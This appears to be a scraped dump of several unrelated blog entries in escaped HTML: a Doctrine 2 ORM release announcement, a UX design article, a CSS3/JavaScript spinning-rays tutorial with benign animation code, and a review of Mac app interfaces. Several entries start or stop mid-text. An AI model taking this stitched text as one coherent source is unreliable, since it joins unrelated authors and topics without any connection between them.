object-structure. This feature is used by the Doctrine Query Language itself and is a first-class citizen of the library. It essentially allows you to make use of powerful vendor-specific features and complex SQL statements without having to cirumvent the ORM completely.</li>\n<li>Inheritance is not akward anymore. There are now three different types of inheritance to choose from: Mapped Superclasses, Single-Table- and Joined-Table-Inheritance.</li>\n<li>Many more features, just see the reference guide on what is possible with Doctrine 2.</li>\n</ul>\n\n<h2>Why did we take so long to develop this new major release?</h2>\n\n<p>There are several reasons:</p>\n\n<p>The refactoring of the original Doctrine 1 code marks a paradigm shift in how we approach object persistence in PHP. Making use of PHP 5.3 only features we could write an ORM whose internals are much more powerful than the first version of Doctrine. This meant rewriting lots of features from scratch and refactoring other code beyond recognition. Many features were carefully implemented and have been discussed for weeks or month in our team. We feel that not a single feature in this release can be called a hack or has negative architectural implications along the road.</p>\n\n<p>As a user an ORM means committing yourself to a library that you haven't written yourself and trust it to handle your most important code: The business and domain logic. We wanted to release a high quality library and make sure it has no bugs when it is released. This explains why the first alpha was already released over a year ago and we have been fixing every little bug that appeared for the last 14 months. When you download Doctrine 2 now we feel this code is more stable and much more maintainable than Doctrine 1. The ORM itself has about 1000 tests where half of these are functional tests that successfully run against all the supported database vendors MySQL, SQLite, PostgreSQL, Oracle and MSSQL. The database access layer and common libraries come with an additional 400 tests.</p>\n\n<p>We wanted the release to ship with a complete and well-thought-out documentation. Writing such a documentation takes time. The current documentation is probably not perfect, but it contains a very detailed reference guide and a small tutorial to get started. Additionally there is a cookbook with several recipes that you can use with your Doctrine 2 project.</p>\n\n<p>While Doctrine 1 had pretty powerful SQL abstraction we felt there were better libraries out there that could be incoporated into Doctrine 2. The new database abstraction layer of Doctrine 2 is much more powerful than the Doctrine 1 DBAL and is powered by code from other great libraries such as Zeta Components, Zend Framework and PEAR MDB2. On top of this it can also be used standalone, you can use the DBAL without having to use the ORM.</p>\n\n<h2>Dropping Features of Doctrine 1</h2>\n\n<p>But Doctrine 2 is not only a new version of Doctrine 1. We also dropped a lot of features that we find inappropriate for the core of an ORM library:</p>\n\n<ul>\n<li>Validators have been dropped. Use a framework library like Zend or Symfony for validator support, they ship much more powerful validators than Doctrine 1 ever had. If you don't like frameworks there is ext/filter to consider.</li>\n<li>We killed the magic features: Doctrine 2 does not offer behaviors as a core feature anymore. We came to the conclusion that behaviors in the core lead to the big ball of mud called Doctrine 1. The code is nearly unmaintainable because of all the special logic and magic that works everywhere. That is why Doctrine 2 focuses on being a consistent and extensible object-relational mapper only and behaviors should be released as extensions on top of Doctrine 2. While this approach was questioned by many of the Doctrine 1 users we think this is the right approach. We are already seeing third party libraries and extensions like Doctrator based on Doctrine 2 that implement these features.</li>\n<li>Explicit multiple connection support has been dropped. Use multiple instances of <code>Doctrine\\DBAL\\Connection</code> or <code>Doctrine\\ORM\\EntityManager</code>. Doctrine 2 uses no global state that could affect the usage of multiple instances.</li>\n</ul>\n\n<h2>Is Doctrine 2 backwards compatible?</h2>\n\n<p>No it is not. Doctrine 1 and 2 have nothing in common. For what its worth they only share the same project name. You cannot simply move from your Doctrine 1.2 to a Doctrine 2 project. Why didn't we release a backwards compatible ORM? Because we think Doctrine 1 has architectural flaws that cannot be fixed.</p>\n\n<h2>What is the plan for Doctrine 2 beyond this release?</h2>\n\n<p>With the core that is now Doctrine 2 we plan to keep the library backwards compatible at all times. Not only for minor and mini-releases such as 2.0.1 or 2.1, even for potential releases of a Doctrine 3 or 4 version we plan to avoid public API refactorings as much as possible. If however we feel that there is overwhelming evidence that a public API refactoring makes the ORM faster and leads to more maintainable code we will not hesitate to break API for a 3.0 release.</p>\n\n<p>This approach comes at costs that we are willing to pay. All new features have to pass a requirements discussion and pros/cons are carefully weighted against each other. That is also why we try to expose as little of our internals as possible. This certainly hurts extensibility of Doctrine 2, but with our expected quality level and review process we hope to bring the costs of this approach down. You should never be forced to extend Doctrine 2 just to fix bugs, which is the most important reason for extensibility in other PHP libraries.</p>\n\n<h2>Where do I start?</h2>\n\n<p>You can download Doctrine 2 <a href=\"http://www.doctrine-project.org/projects/orm/download\">from our downloads section</a>, <a href=\"http://pear.doctrine-project.org/\">install it via PEAR</a> or find it in the <a href=\"http://github.com/doctrine/doctrine2\">Github repository</a>. Symfony 2 also ships with a current version of Doctrine 2. After you installed Doctrine 2 you can <a href=\"http://www.doctrine-project.org/docs/orm/2.0/en/\">go to the documentation</a> and start reading the reference guide or <a href=\"http://www.doctrine-project.org/docs/orm/2.0/en/tutorials/getting-started-xml-edition.html\">the tutorial</a>.</p>\n\n<p>If you find any bugs or have feature requests you should check our <a href=\"http://www.doctrine-project.org/jira\">Bug-Tracker and report bugs or feature requests</a>. If you want to discuss about Doctrine 2 you can either <a href=\"http://www.doctrine-project.org/community\">use the Google Group or join the #doctrine channel on the Freenode IRC Network</a>. Also make sure to check the current <a href=\"http://www.doctrine-project.org/docs/orm/2.0/en/reference/limitations-and-known-issues.html\">Limitations and Known Issues section</a> in the docs. We are trying to be honest about what Doctrine 2 can and can't do but might do in the future.</p>\n</div>"

Is experience more of a modern currency or something beyond that, more profoundly attached to how people live and act in a global online marketplace?</p>\n<p>\n<strong>\nUser experience in web design starts with real people and grows from there</strong> - not only the people who are customers, but also the people who are involved in the process of building a website. There is an interesting blend of knowledge, goals and ideas that go into the process of designing for the best user experience. Throughout this post we will talk about three major components that go into designing great experiences. </p>\n<p> Since user experience is the end result of and encompasses all parts of the creative process, we have designed this awesome infographic to illustrate and explain what is involved when creating the best user experience. The infographic can be useful to both businesses and creatives for a detailed look at the components that make up UX design.</p>\n<p><a href=\"http://velorastudios.com/UX-Design-Made-by-People-for-People\"><img alt=\"\" src=\"http://www.velorastudios.com/blogimg/Infographic-blog-image1.jpg\"></a></p>\n<span><a href=\"http://velorastudios.com/UX-Design-Made-by-People-for-People\"><strong>Infographic: UX Design - Made by People for People <em>(click to download and view larger)</em></strong></a></span><br>\n</div>\n<h3>Is Usability a Good Metric for User Experience?</h3>\n<p>One of the biggest frustrations for businesses and web design studios is to find out that people do not use their website the way they intended. Usually these problems are discovered through usability studies. When defining usability, we think of a product's ability to help users reach goals efficiently and easily. Related to that, a website's usability can be studied by measuring the user satisfaction when a user is using the interface to find something or accomplish a task. Poor usability will cause a business to lose potential customers. If a site has poor usability then the business will have a number of visitors who want to make a purchase, but give up and leave the website because of a poor experience. </p>\n<p>Usability is a powerful metric to start with, but user experience cannot be limited to that. In fact, it makes sense to put on your business spectacles first and think about user experience as <a href=\"http://velorastudios.com/_blog/Velora_Studios_Blog/post/Style-in-Interaction-and-UX-Design/\">a strategy for interaction through design</a>, rather than being content with simply building a website that is usable. When we design for great user experiences, we take into consideration three major components: Information Architecture, Interaction &amp; Dialog and Design &amp; Development.</p>\n<h2>Start with Information Architecture</h2>\n<p>The scope of information architecture is to structure information, databases and content in a logical way. At a very basic level information architecture is connected to usability through navigation, accessibility and website structure. From a business standpoint, information architecture is connected to the goals, products and services of the company, presented in such a way that people can use and relate to.</p>\n<h3>Navigation</h3>\n<p>One of the simplest and safest method to improve user experience is to make sure that the interface you build makes user's navigation towards the goal as frictionless as possible. If your site's purpose is to provide specific data from different streams of information, make it as simple and as fast as possible for the user to get it. Easy access to relevant information makes the user feel satisfied with the site's ability to respond according to their expectations.</p>\n<p>In some cases, users will have to give something in return for finding/doing what they want on the website. Sometimes they will provide contact information, other times they will have to register for a paid monthly subscription. The point is that frictionless experiences are something that users will feel comfortable and even enjoy paying for.\n</p>\n<p>Great business players with a rich and engaging strategy make sure that easy and fast navigation, as well as instant access to various services are provided to their users. This approach is already raising the benchmark for the rest of companies who turn high usability into a pulley for additional profit.</p>\n<div><a href=\"http://www.flickr.com/photos/purecaffeine/4327488184/\" title=\"Sketching by NathanaelB, on Flickr\"><img src=\"http://farm3.static.flickr.com/2738/4327488184_ec81ea538c.jpg\" width=\"500\" height=\"333\" alt=\"Sketching\"></a></div>\n<span><strong>Photo by: </strong><a href=\"http://www.flickr.com/photos/purecaffeine/\">Nathanael Boehm</a></span>\n<h3>Technology</h3>\n<p>Information Architects will also have the responsibility of analyzing the project requirements and providing advice on what technology the team should use for best performance and scalability. At the same time, they should be able to make an assessment of the client's current hardware and resources and make suggestions on migrating to a different platform, if required.</p>\n<h3>Workflow</h3>\n<p>\nThe best way to start with your UX strategy is knowing what works best for your own business and how long it will take to do that. This implies that you are aware of the costs and resources needed for building and maintaining a website, especially if your website is a web app where additional resources will be necessary. Commonly people involved in the workflow setup are also leading the development team. What they need to be aware of is the budget, deadline, project requirements and available resources - like databases, hardware, technical sheets and so on. From an operational point of view it is most efficient to start working on the information architecture of the website and then organize and plan the project along those lines.</p>\n<p><a href=\"http://velorastudios.com/UX-Design-Made-by-People-for-People\">View and download the full-size infographic.</a></p>\n<h2>Interaction and Dialog - Guidelines for a Better User Experience</h2>\n<br>\n<p>Focusing on user experience should first be aligned to the company's communication strategy. There are six aspects of communication pertaining to interactive marketing methods that you need to consider: content, interaction, dialog, support, presence and engagement. Depending on the industry, a high level of engagement can be achieved in different ways. Sometimes betting on more interaction pushes user experience outside the boundaries where communication is actually effective. For example, inviting the user to find a plane ticket by first viewing a virtual tour of the agency may not be the best choice. Though the virtual tour may be flawless, this experience is not in tune with the user's primary motivation to be there, that is, purchasing a plane ticket.</p>\n<p>We have already talked about <a href=\"http://velorastudios.com/_blog/Velora_Studios_Blog/post/Why-Content-Will-Always-Be-King/\">Why Content Will Always be King</a> when it comes to positioning and influence. Great content facilitates dialog and helps the business gain a stronger web presence, especially if the content provided can be shared by people. Of course, there are a couple of SEO-related benefits derived from generating great content online, but the company's goal should be greater than that. Strong brands encourage communication on multiple levels, in meaningful ways. Storytelling has a lot to do with crafting captivating experiences through interaction and dialog; read our previous post about <a href=\"http://velorastudios.com/_blog/Velora_Studios_Blog/post/Lessons-in-Design-from-Storytellers/\">Storytelling in Web Design</a> or learn more about <a href=\"http://velorastudios.com/_blog/Velora_Studios_Blog/post/Telling-a-Story-with-Your-Brand/\">Telling a Story through Your Brand</a>.\n</p>\n<div>\n<a href=\"http://www.flickr.com/photos/reillyphoto/4589200221/\" title=\"Northern Voice 2010 by Jerk with a Camera, on Flickr\"><img src=\"http://farm5.static.flickr.com/4044/4589200221_aef48b7500.jpg\" width=\"500\" height=\"333\" alt=\"Northern Voice 2010\"></a></div>\n<span><strong>Photo by: </strong><a href=\"http://www.flickr.com/photos/reillyphoto/\">Reilly Lievers</a></span>\n<h2>Design and Development</h2>\n<h3>Design</h3>\n<p>Designing for better user experience is designing for human beings. Get to know the people you design for: understand the company, the team, the products and why customers would want to find them. There is a lot of research involved with that. Some of the first topics that deserve investigation are: brand image, customer profile and competition. It's also useful to learn about previous marketing campaigns and understand the style and the personality of the company. What words best describe it? What do people already know about it?\n</p>\n<p>There are two main types of workflow when it comes to web design: first, it's iterative design, where the interface is continuously improved and  adjusted. Second, it's a more practical approach where you provide the client with the design and allow for a couple of reviews on it; this is called \"Big Design Up Front\". Both of these workflows start with the initial working prototype and with a few initial specifications - such as color palettes, structure and style.</p>\n<h3>Develop</h3>\n<p>Design and development can be tracked and run separately, but there are a lot of inconveniences that either the client or one of the teams will have to handle in time, if that is what happens. The most efficient scenario is where development starts immediately after the Big Design Up Front phase and runs parallel to other minor design iterations related to that. Some of the challenges involved with development are usually related to building custom applications, integrating modules previously developed by the company and optimizing the system for high performance, for different browsers and for various devices. There are a wide variety of web technologies the company can decide to use to accomplish this. Taking a look at what your competition does and what they do to engage with customers online is a smart practice. This is usually called benchmarking and it's not a practice related only to marketing anymore.</p>\n<h3>Test</h3>\n<p>When it comes to business intelligence and website testing, large companies will often want to outsource most of it to the big shark agencies in the industry. That is not very affordable for start-ups, but once the budget can be stretched to include testing, you're on your way to strengthening your position and strategy through business intelligence. In UX design, there are a few common methods that gained popularity through the last five years.</p>\n<p>Based on the depth of investigation and the method of gathering data, a company can run usability tests using eye-tracking, A-B testing and task completion tests. Also, design and experience is measured through self-reported metrics, guided interviews and brand awareness studies.</p>\n<p>There are a few really amazing apps designed to measure and monitor engagement, web analytics and performance, as well as traditional ways to learn about your customers feedback and experience with the website - through e-mail, social media channels and online support.</p>\n<p>Choosing from either of these is strictly related to costs, time and experience. Paid services provide relevant data over time, but using this data to make decisions is really the scope of testing. You can't get around that, no matter how hard your try.</p>\n<div><img alt=\"\" src=\"http://velorastudios.com/blogimg/Testing-UXInfographic-blog.jpg\"></div>\n<span><strong>Photo by: </strong><a href=\"http://www.flickr.com/photos/stevelacey/\">Steve Lacey</a></span>\n<h3>So What Is User Experience?</h3>\n<p>This question is fascinating, isn't it? How about trying to answer another question instead: what makes a great memory? Is it about the people you meet, the setting you were in, the music that was playing or the emotions you felt? Great memories come with smooth experiences. It's when everything comes out right. you can actually isolate a great memory and just reflect on it for a couple of minutes. It is unique and powerful.</p>\n<p>A good metaphor of UX is <a href=\"http://en.wikipedia.org/wiki/Fourth_wall\">\"The Fourth Wall\"</a> metaphor. When people watch a great performance, they sit in front of the theater scene. There are three walls with decorations and light surrounding the scene that remind the audience that everything is staged, directed and practiced. The fourth wall is the invisible boundary between reality and fiction. The audience watches the performance through this wall and its transparency draws the audience in for the two hours that they sit there, totally immersed in the performance. This is user experience.</p>\n<div>\n<p><strong>Endnote:</strong> UX design is a challenge for both the company and the creative agency working on it.

You can set an initial rotation value as well.</p><h2>The JavaScript</h2><p>The spinning rays effect works by using JavaScript to update browser-specific CSS3 animation properties.  The first step is detecting the browser:</p><pre>\nvar cssPrefix = false;\nswitch(Browser.name) {\n\tcase \"safari\":\n\t\tcssPrefix = \"webkit\";\n\t\tbreak;\n\tcase \"chrome\":\n\t\tcssPrefix = \"webkit\";\n\t\tbreak;\n\tcase \"firefox\":\n\t\tcssPrefix = \"moz\";\n\t\tbreak;\n\tcase \"opera\":\n\t\tcssPrefix = \"o\";\n\t\tbreak;\n\tcase \"ie\":\n\t\tcssPrefix = \"ms\";\n\t\tbreak;\n}\n</pre><p>I’ve chosen to use MooTools’ Browser object to detect the browser.  jQuery and other libraries provide a method by which to get the current browser.  As you can tell by the code, this effect will support Webkit-based browsers (Chrome, Safari, Webkit-mobile), Firefox, and Opera.  Once the current browser is detected, you set forth a setInterval directive to perodically update the degree rotation of the element:</p><pre>\n// Spin them rays!\nif(cssPrefix) { // Skip IE!\n\tvar rays = document.getElementById(\"rays\"), degrees = 0, speed = 0.05;\n\tsetInterval(function() {\n\t\tdegrees += speed; // degree adjustment each interval\n\t\trays.setAttribute(\"style\",\"-\" + cssPrefix + \"-transform:rotate(\" + degrees + \"deg)\");\n\t},20);\n}\n</pre><p>With MooTools it would look like:</p><pre>\n// Spin them rays!\nif(cssPrefix) { // Skip IE!\n\tvar rays = $(\"rays\"), degrees = 0, speed = 0.05;\n\t(function() {\n\t\tdegrees += speed; // degree adjustment each interval\n\t\trays.set(\"style\",\"-\" + cssPrefix + \"-transform:rotate(\" + degrees + \"deg)\");\n\t}).periodical(20);\n}\n</pre><p>I’ve found a 20 millisecond class assignment interval provides a smooth but subtle transition.  After all you don’t want the ray movement to steal the user’s attention. To add some fun you could adjust the speed of the animation when the user mouses in and out of the element:</p><pre>\nrays.addEvents({\n\tmouseenter: function() { // 5x! Warp speed!\n\t\tspeed = 0.25;\n\t},\n\tmouseleave: function() { // Back to normal;\n\t\tspeed = 0.05;\n\t}\n});\n</pre><div><a href=\"http://davidwalsh.name/dw-content/spinning-rays.php\">View Demo</a><div></div></div><p>Subtlety is the key to using this effect…effectively.  Using CSS properties to transition the element’s rotation is even more optimal, seeing as they’re native to the browser.  You’ll want to be sure not to use this effect to much on a given page, as many concurrent animations can be taxing to any browser.  I’d also like to point out that Safari and Chrome handle these animations best.</p><p><strong>Follow Me!</strong> <a href=\"http://twitter.com/davidwalshblog\">Twitter</a> | <a href=\"http://www.facebook.com/#!/pages/David-Walsh-Blog/186644584869\">Facebook</a> | <a href=\"http://www.linkedin.com/in/davidjameswalsh\">LinkedIn</a> | <a href=\"http://mootools.net/forge/profile/davidwalsh\">MooTools Forge.</a><br><br>Full David Walsh Blog Post: <a href=\"http://davidwalsh.name/javascript-spin\">Create Spinning Rays with CSS3 Animations &amp; JavaScript</a></p><p>Related posts:<ol><li><a href=\"http://davidwalsh.name/css-spin\" rel=\"bookmark\" title=\"Permanent Link: Create Spinning, Fading Icons with CSS3 and MooTools\">Create Spinning, Fading Icons with CSS3 and MooTools</a></li><li><a href=\"http://davidwalsh.name/fade-spin-css3-jquery\" rel=\"bookmark\" title=\"Permanent Link: Create Spinning, Fading Icons with CSS3 and jQuery\">Create Spinning, Fading Icons with CSS3 and jQuery</a></li><li><a href=\"http://davidwalsh.name/css-transform-rotate\" rel=\"bookmark\" title=\"Permanent Link: Rotate Elements with CSS Transformations\">Rotate Elements with CSS Transformations</a></li><li><a href=\"http://davidwalsh.name/css-transformations\" rel=\"bookmark\" title=\"Permanent Link: Sexy Link Transformations with CSS\">Sexy Link Transformations with CSS</a></li><li><a href=\"http://davidwalsh.name/mootools-rotate\" rel=\"bookmark\" title=\"Permanent Link: Fx.Rotate:  Animated Element Rotation with MooTools\">Fx.Rotate:  Animated Element Rotation with MooTools</a></li></ol></p><img src=\"http://feeds.feedburner.com/~r/Bludice/~4/q-O0lYmP9fU\" height=\"1\" width=\"1\">"

      "content" : "<p>Interface design is a valuable skill to possess. Every decision you make, be it something as major as a color scheme or as minor as a stroke width, can potentially have a huge impact on whether or not people decide to use the application, website, etc. We designers know this better than anyone because we tend to be interface snobs, meaning we flat out refuse to use an app with poor design, even if the functionality is stellar. </p>\n<p>The next time you’re faced with the task of designing an interface, why not learn from those who have already succeeded? Below we’ll take a look at the interfaces of ten beautiful and fairly new Mac applications and discuss what went right. </p>\n<p><span></span><br>\n<em>Like the article? Be sure to subscribe to our <a rel=\"nofollow\">RSS feed</a> and follow us on <a rel=\"nofollow\" href=\"http://twitter.com/designshack\">Twitter</a> to stay up on recent content.</em></p>\n<h2><a rel=\"nofollow\" href=\"http://www.6wunderkinder.com/wunderlist/\">Wunderlist</a></h2>\n<p>The wizards at 6Wunderkinder are quietly taking over the productivity app industry with a killer combination: great design, simple functionality and an unbeatable price tag (free). Both their iPhone and desktop app look just excellent. </p>\n<div><a rel=\"nofollow\" href=\"http://www.6wunderkinder.com/wunderlist/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-3.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The key to the awesomeness of the Wunderlist interface is something extremely simple that we just don’t see enough of in Mac application interfaces: customization. Wunderlist comes built in with a whole bunch of gorgeous backgrounds like the wooden one shown above. Since the UI elements are actually fairly minimal, swapping out the background changes the entire personality of the application! </p>\n<p>Why spend hours scratching your head wondering what your users will like the most when you know that every user is different? Providing your users with a number of equally attractive but very different options is a solid way to increase customer satisfaction. One important hint: make sure it’s easy to switch between the options. As a rule of thumb, if you have to write a tutorial on how to do it, it’s too complex. Wunderlist simply provides a row of icons at the bottom of the window. When you click on one, the background changes. It’s that simple. </p>\n<p>The one killer feature that I think would make this even better is if users could use their own images as a background. Sure, plenty of your users will choose something hideous but there will also be a ton of users who come up with something that’s actually better than the built-in options.</p>\n<p>I’m making a prediction that lots of developers will follow in the footsteps of 6Wunderkinder and begin offering users the ability to personalize their application interfaces to fit their unique personalities. </p>\n<h2><a rel=\"nofollow\" href=\"http://reederapp.com/\">Reeder</a></h2>\n<p>Reeder for Mac is making a big splash in the Mac design community. Most of us have used NetNewsWire for ages and are definitely sick of the stagnant and boring interface. By contrast, Reeder is a breath of fresh air offering a notably clean and non-cluttered looking interface for an RSS reader. </p>\n<div><a rel=\"nofollow\" href=\"http://reederapp.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-1.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The awesome thing about Reeder is that it represents another growing trend you can expect to see on the rise in the next few years: Apple iOS design on the desktop (Reeder began life on iOS). The iPhone lit a wildfire under interface developers who began churning out buttery smooth interfaces unlike anything we’d ever seen. This fire has recently been lit anew with the arrival of the iPad and innovative new interactive experiences like Flipboard. </p>\n<p>Gradually, we’ve been seeing these design trends trickle back to the Mac. Even Apple has realized the benefits of iOS-like interfaces and is incorporating many of these benefits into OS X Lion, the next major release of Apple’s legendary desktop operating system. </p>\n<h2><a rel=\"nofollow\" href=\"http://sparrowmailapp.com/\">Sparrow</a></h2>\n<p>I hesitated to add Sparrow because it is quite controversial among designers. The reason for this is that it represents a shameless ripoff of the UI of another popular application: <a rel=\"nofollow\" href=\"http://www.atebits.com/tweetie-mac/\">Tweetie for Mac</a>. </p>\n<div><a rel=\"nofollow\" href=\"http://sparrowmailapp.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-2.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>On one side of this debate you have legitimate claims that Tweetie has been stagnant in development for quite a while now and will likely stay that way because of its acquisition by Twitter (who really just wanted the iPhone app). Designers on the other side claim that it’s pretty uncool to rip off another man’s interface no matter the circumstances.</p>\n<p>Regardless of which side of the debate you’re on, Sparrow is an interesting example for one important reason. It took a format that we were used to in one category (Twitter apps) and sought to apply it in a completely different context (email). This type of thinking is a stellar source of innovation. Take a look at all the apps you use every day, now take a look at the competing apps in that category. Chances are, they’re all about the same because someone innovated the category and everyone else simply followed. If you want to create something truly different, ask yourself how you could take the concept of that app and fit it into the structure of an app from a different category. You might just revolutionize an entire category. </p>\n<h2><a rel=\"nofollow\" href=\"http://kiwi-app.net/\">Kiwi 2</a></h2>\n<p>Though the functionality still doesn’t feel quite as smooth as Tweetie, Kiwi has to be one of the most attractive desktop Twitter clients on the market.</p>\n<div><a rel=\"nofollow\" href=\"http://kiwi-app.net/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-4.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>As with Wunderlist, the key element here is customization. Kiwi offers users a number of themes to choose from that radically alter the appearance of the application. Wunderlist takes the simple route and offers different backgrounds, but in Kiwi, everything in your stream changes. This includes the shape and color of the tweets, the background and the appearance of the icons. Even the functionality alters pretty dramatically from one theme to the next. For instance, one theme simply shows you a list of usernames and hides the actual tweets until you click on a user to see what they said. </p>\n<p>The execution here is very important. Kiwi doesn’t require you to choose a specific theme or walk you through some advanced setup process. The app has all the default settings worked out for you. In fact, if you never poke around in the preferences menu, you could use Kiwi for quite a while before even finding the customization options. They’re not exactly hidden, power users will find them in the first place they think to look. However, users who want a simple experience aren’t being hit over the head with intimidating decisions that they’re not prepared to make. </p>\n<p>The lesson here is that customization should be both simple and optional. Don’t force your users into it or they’ll close the app and turn elsewhere. Let your users love your app for what it is and work their way up to making it look how they want as they become more familiar with how everything works. </p>\n<h2><a rel=\"nofollow\" href=\"http://www.daisydiskapp.com/\">DaisyDisk</a></h2>\n<p>Daisy Disk is the most attractive hard drive storage visualization I’ve ever seen. The retro futuristic charts look so good you’ll want to print them and use them as office art. </p>\n<div><a rel=\"nofollow\" href=\"http://www.daisydiskapp.com/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-5.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The important question to ask here is whether or not you have to sacrifice usability in your quest for aesthetics. The crazy pie chart shown above looks quite complicated and is probably enough to scare away a lot of users. However, the implementation is actually quite solid. Next to the graph is a simple list showing the types of data on your hard drive and how much space is being eaten up by them. All the information you need is in this list. It’s simple, straightforward and easy to understand. The visualization is there for visual thinkers like us designers who are crazy enough to favor this representation over a list. </p>\n<p>Most importantly, the two representations of the data are linked in an interactive way. When you hover your mouse over the “Applications” line item, that part of the chart begins to glow. So even if you don’t remotely understand the chart at first, it will suddenly begin to make sense as you hover over each item in the list and see how the proportion of glowing space relates to other sections.</p>\n<p>The lesson here is that eye candy isn’t for everyone. If you want to set your application apart as the one with crazy beautiful visualizations, go for it. But don’t neglect the users who would rather use Excel than Photoshop. Make sure your attractive graphics have a strong foundation in easy-to-use controls and understandable communication methods. </p>\n<h2><a rel=\"nofollow\" href=\"http://www.panic.com/transmit/\">Transmit 4</a></h2>\n<p>Transmit 4 is the latest update to the reigning patriarch of Mac FTP clients and represents one of the most significant aesthetic boosts to the application to date. I never thought I would drool over an FTP client but Transmit now has a ton of really nice screens, animations, buttons and more.</p>\n<div><a rel=\"nofollow\" href=\"http://www.panic.com/transmit/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-6.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The most noticeable tactic used here is increased contrast. FTP clients are notably bright and white; every screen, every list of files, nothing but white and, if you’re lucky, a little gray and/or blue. The folks at Panic decided to tackle this monotony with a number of really beautiful dark screens for setting up servers, navigating favorites, etc. </p>\n<p>The important lesson here is that they really didn’t mess with the meat of the app too much. The file lists are still on a white background and function just like they always have. Anyone familiar with FTP software will be able to pick the app up and run with it immediately. Any time you want to update a UI to give it some visual flair, don’t be afraid to be extremely choosey about what parts do and don’t get updated. If you’re working with a product made popular by its simple functionality, keep it that way. Instead, take the time to focus on all the little details that really polish off a UI and make it feel like a major step up from the competition.</p>\n<h2><a rel=\"nofollow\" href=\"http://www.realmacsoftware.com/courier/\">Courier</a></h2>\n<p>Courier has to be the most beautiful tool on the planet for quickly sharing multimedia files using social media. Would I ever pay $20 for a Facebook image uploader? No way. Has this one made me seriously consider changing my mind? Yep.</p>\n<div><a rel=\"nofollow\" href=\"http://www.realmacsoftware.com/courier/\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-7.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The lesson here is one I’ve discussed countless times in a web design context: visual metaphors rock. The first thing RealMac did was focus on core functionality. They made sharing files to all kinds of networks at once a ridiculously easy task powered by the drag and drop experience Mac users know and love. With an unbeatable workflow in place (always make sure to focus on content first!), they were able to wrap the whole thing in a beautiful and appropriate theme: the daily mail. This takes a fairly technological task and brings it into a very real and familiar experience for the user. Suddenly the mundane task of uploading files looks and feels like a virtual mail-sending video game where you can choose what envelope you want to use and where to send it. </p>\n<h2><a rel=\"nofollow\" href=\"http://agilewebsolutions.com/onepassword\">1Password</a></h2>\n<p>Open up Keychain Access on your Mac. This is a typical password manager, designed by none other than Apple inc. It’s quite usable but also quite boring. Now take a look at a very different visual approach to the same basic functionality in 1Password. </p>\n<div><a rel=\"nofollow\" href=\"http://agilewebsolutions.com/onepassword\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-8.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Quite the difference no? 1Password possesses a simply outstanding interface for managing your logins, passwords, form data, etc. I don’t know about you but this makes me question every single database application on my hard drive. Why has the norm become to make such plain presentations of database information? What if applications like Evernote (already one of the more attractive database apps out there) looked a little more like 1Password or Bento? Would that be so bad? I submit that it would not.</p>\n<p>Great aesthetics don’t complicate usability, they improve it. Believe it or not, you can present tables, rows, cells and fields of information in a really attractive manner without adding so much superfluous fluff that it ruins the functionality. If you don’t believe me, download 1Password and give it a shot. </p>\n<h2><a rel=\"nofollow\" href=\"http://www.chocomoko.com/sweetfm\">SweetFM</a></h2>\n<p>In contrast to all this discussion of adding visual interest to your your interfaces, SweetFM, a wonderfully simple Last.fm client, does the exact opposite. Just take a look at how compact and attractive it is! </p>\n<div><a rel=\"nofollow\" href=\"http://www.chocomoko.com/sweetfm\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-9.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Now, compare that screenshot you just saw to the official Last.fm client for Mac:</p>\n<div><a rel=\"nofollow\" href=\"http://www.chocomoko.com/sweetfm\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-11.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>Admittedly, many people will like the official client better. It seems more robust and puts everything in front of you at once (a highly efficient approach). However, there’s definitely something to be said for drastic simplification. Back to a point that we made earlier, blindly following the UI conventions of a given category is no way to innovate. Sometimes you can snag a ton of users that no one else is targeting simply by stripping out everything but the absolute bare necessities. Take a page out of Chocomoko’s book, sometimes less really is more.</p>\n<h2><a rel=\"nofollow\" href=\"http://www.cockpitapp.com/index.html\">Cockpit</a></h2>\n<p>Cockpit is an awesome menu bar app that you can use to control all kinds of stuff on your Mac. It’s not only super functional though, it also happens to look pretty stellar.</p>\n<div><a rel=\"nofollow\" href=\"http://www.cockpitapp.com/index.html\"><img src=\"http://designshack.co.uk/wp-content/uploads/macinterfaces-10.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>In this case, I’m not sure where the developers are drawing their inspiration from. The typical textures are here: metal, glass and rubber. Yet, the iTunes controller above doesn’t look anything like iTunes and it sure as heck doesn’t look like any other menu bar app I’ve ever seen (it looks more like a Dashboard widget). There’s a lot to be said about drawing inspiration from all of the examples you’ve seen today, but always remember that there’s no substitute for blazing your own path and intentionally trying to be completely different than anything else you’ve seen before. </p>\n<p>Pull up Photoshop, crank some music and spend a few hours dishing out ideas as they come to you. Instead of focusing on what’s been done elsewhere, try to discover what hasn’t been done and explore the possibilities with that goal in mind. </p>\n<h2>Conclusion</h2>\n<p>I hope the ten awesome applications above have both provided you with a few new apps for your Mac and taught you a thing or two about interface design. Mac developers and designers continually wow me with their ability to continually push the envelope for the level of beauty we expect from desktop applications. You guys are my heros.</p>\n<p>Leave a comment below and let us know what you think of the interfaces above. Also be sure to point out any other new Mac apps you’ve come across that serve as an excellent example of UI design. </p>"

